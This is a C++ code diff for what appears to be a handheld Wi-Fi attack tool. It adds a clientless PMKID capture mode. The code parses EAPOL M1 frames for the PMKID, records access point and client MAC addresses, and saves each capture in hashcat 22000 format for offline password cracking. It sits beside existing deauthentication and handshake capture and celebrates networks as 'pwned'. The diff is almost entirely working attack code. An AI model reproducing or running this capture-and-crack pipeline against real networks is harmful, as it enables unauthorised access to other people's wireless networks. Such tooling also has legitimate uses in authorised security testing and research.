@@ -39,6 +39,9 @@ static uint8_t pendingDeauthStation[6] = {0};
 static volatile bool pendingHandshakeComplete = false;
 static char pendingHandshakeSSID[33] = {0};
 
+static volatile bool pendingPMKIDCapture = false;
+static char pendingPMKIDSSID[33] = {0};
+
 // Pending log messages (simple ring buffer for debug output)
 #define PENDING_LOG_SIZE 4
 #define PENDING_LOG_LEN 96
@@ -75,6 +78,7 @@ uint32_t OinkMode::lastHopTime = 0;
 uint32_t OinkMode::lastScanTime = 0;
 std::vector<DetectedNetwork> OinkMode::networks;
 std::vector<CapturedHandshake> OinkMode::handshakes;
+std::vector<CapturedPMKID> OinkMode::pmkids;
 int OinkMode::targetIndex = -1;
 uint8_t OinkMode::targetBssid[6] = {0};
 int OinkMode::selectionIndex = 0;
@@ -131,6 +135,7 @@ void OinkMode::init() {
     pendingNewNetwork = false;
     pendingDeauthSuccess = false;
     pendingHandshakeComplete = false;
+    pendingPMKIDCapture = false;
     pendingLogHead = 0;
     pendingLogTail = 0;
     
@@ -144,6 +149,7 @@ void OinkMode::init() {
     
     networks.clear();
     handshakes.clear();
+    pmkids.clear();;
     targetIndex = -1;
     memset(targetBssid, 0, 6);
     selectionIndex = 0;
@@ -285,6 +291,13 @@ void OinkMode::update() {
         Mood::onHandshakeCaptured(pendingHandshakeSSID);
         lastPwnedSSID = String(pendingHandshakeSSID);
         pendingHandshakeComplete = false;
+    }
+    
+    // Process pending mood: PMKID captured (clientless attack - extra special!)
+    if (pendingPMKIDCapture) {
+        Mood::onPMKIDCaptured(pendingPMKIDSSID);
+        lastPwnedSSID = String(pendingPMKIDSSID);  // PMKID counts as pwned!
+        pendingPMKIDCapture = false;
     }
     
     // ============ End Deferred Event Processing ============
@@ -988,6 +1001,60 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
         }
     }
     
+    // ========== PMKID EXTRACTION FROM M1 ==========
+    // PMKID is in Key Data field of M1 when AP supports it
+    // EAPOL-Key frame: ... key_data_length(2) @ offset 97-98, key_data @ offset 99
+    // Key Data contains RSN IE with PMKID: dd 14 00 0f ac 04 [16-byte PMKID]
+    if (messageNum == 1 && len >= 121) {  // 99 + 22 bytes minimum for PMKID
+        uint16_t keyDataLen = (payload[97] << 8) | payload[98];
+        
+        // PMKID Key Data is exactly 22 bytes: dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
+        if (keyDataLen >= 22 && len >= 99 + keyDataLen) {
+            const uint8_t* keyData = payload + 99;
+            
+            // Look for PMKID KDE: dd 14 00 0f ac 04 (vendor IE, IEEE OUI, PMKID type)
+            // Can appear at start or within Key Data
+            for (uint16_t i = 0; i + 22 <= keyDataLen; i++) {
+                if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
+                    keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
+                    keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
+                    
+                    // Found PMKID! Extract the 16 bytes
+                    const uint8_t* pmkidData = keyData + i + 6;
+                    
+                    // Check if we already have this PMKID
+                    int pmkIdx = findOrCreatePMKID(bssid, station);
+                    if (pmkIdx >= 0 && !pmkids[pmkIdx].saved) {
+                        CapturedPMKID& p = pmkids[pmkIdx];
+                        memcpy(p.pmkid, pmkidData, 16);
+                        p.timestamp = millis();
+                        
+                        // Look up SSID
+                        if (p.ssid[0] == 0) {
+                            int netIdx = findNetwork(bssid);
+                            if (netIdx >= 0) {
+                                strncpy(p.ssid, networks[netIdx].ssid, 32);
+                                p.ssid[32] = 0;
+                            }
+                        }
+                        
+                        queueLog("[OINK] PMKID captured! SSID:%s BSSID:%02X:%02X:%02X:%02X:%02X:%02X",
+                                 p.ssid[0] ? p.ssid : "?",
+                                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+                        
+                        // DEFERRED: Queue PMKID event for main thread (3 beeps!)
+                        if (!pendingPMKIDCapture) {
+                            strncpy(pendingPMKIDSSID, p.ssid, 32);
+                            pendingPMKIDSSID[32] = 0;
+                            pendingPMKIDCapture = true;
+                        }
+                    }
+                    break;  // Found it, stop searching
+                }
+            }
+        }
+    }
+    
     // Find or create handshake entry
     int hsIdx = findOrCreateHandshake(bssid, station);
     if (hsIdx < 0) return;
@@ -1079,6 +1146,31 @@ int OinkMode::findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station
     
     handshakes.push_back(hs);
     return handshakes.size() - 1;
+}
+
+int OinkMode::findOrCreatePMKID(const uint8_t* bssid, const uint8_t* station) {
+    // Look for existing PMKID with same BSSID+station pair
+    for (int i = 0; i < (int)pmkids.size(); i++) {
+        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
+            memcmp(pmkids[i].station, station, 6) == 0) {
+            return i;
+        }
+    }
+    
+    // Limit PMKID count to prevent OOM
+    if (pmkids.size() >= MAX_HANDSHAKES) {
+        return -1;
+    }
+    
+    // Create new entry
+    CapturedPMKID p = {0};
+    memcpy(p.bssid, bssid, 6);
+    memcpy(p.station, station, 6);
+    p.timestamp = millis();
+    p.saved = false;
+    
+    pmkids.push_back(p);
+    return pmkids.size() - 1;
 }
 
 uint16_t OinkMode::getCompleteHandshakeCount() {
@@ -1267,6 +1359,85 @@ bool OinkMode::saveHandshakePCAP(const CapturedHandshake& hs, const char* path) 
 bool OinkMode::saveAllHandshakes() {
     bool success = true;
     autoSaveCheck();  // This saves any unsaved ones
+    return success;
+}
+
+bool OinkMode::savePMKID22000(const CapturedPMKID& p, const char* path) {
+    // Save PMKID in hashcat 22000 format:
+    // WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR
+    
+    File f = SD.open(path, FILE_WRITE);
+    if (!f) {
+        Serial.printf("[OINK] Failed to create PMKID file: %s\n", path);
+        return false;
+    }
+    
+    // Build the hash line
+    // PMKID (16 bytes as 32 hex chars)
+    char pmkidHex[33];
+    for (int i = 0; i < 16; i++) {
+        sprintf(pmkidHex + i*2, "%02x", p.pmkid[i]);
+    }
+    
+    // MAC_AP (6 bytes as 12 hex chars, no colons)
+    char macAP[13];
+    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
+            p.bssid[0], p.bssid[1], p.bssid[2], 
+            p.bssid[3], p.bssid[4], p.bssid[5]);
+    
+    // MAC_CLIENT (6 bytes as 12 hex chars)
+    char macClient[13];
+    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
+            p.station[0], p.station[1], p.station[2], 
+            p.station[3], p.station[4], p.station[5]);
+    
+    // ESSID (hex-encoded)
+    char essidHex[65];
+    int ssidLen = strlen(p.ssid);
+    for (int i = 0; i < ssidLen && i < 32; i++) {
+        sprintf(essidHex + i*2, "%02x", (uint8_t)p.ssid[i]);
+    }
+    essidHex[ssidLen * 2] = 0;
+    
+    // Write: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***01
+    // MESSAGEPAIR 01 = PMKID taken from AP
+    f.printf("WPA*01*%s*%s*%s*%s***01\n", pmkidHex, macAP, macClient, essidHex);
+    
+    f.close();
+    Serial.printf("[OINK] PMKID saved to %s (hashcat -m 22000)\n", path);
+    return true;
+}
+
+bool OinkMode::saveAllPMKIDs() {
+    if (!Config::isSDAvailable()) return false;
+    
+    bool success = true;
+    for (auto& p : pmkids) {
+        if (!p.saved && p.ssid[0] != 0) {
+            char filename[64];
+            // Sanitize SSID for filename
+            char safeSsid[17];
+            int j = 0;
+            for (int i = 0; i < 16 && p.ssid[i]; i++) {
+                char c = p.ssid[i];
+                if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || 
+                    (c >= '0' && c <= '9') || c == '-' || c == '_') {
+                    safeSsid[j++] = c;
+                }
+            }
+            safeSsid[j] = 0;
+            if (j == 0) strcpy(safeSsid, "unknown");
+            
+            snprintf(filename, sizeof(filename), "/pmkid_%s_%02X%02X.22000",
+                     safeSsid, p.bssid[4], p.bssid[5]);
+            
+            if (savePMKID22000(p, filename)) {
+                p.saved = true;
+            } else {
+                success = false;
+            }
+        }
+    }
     return success;
 }
 
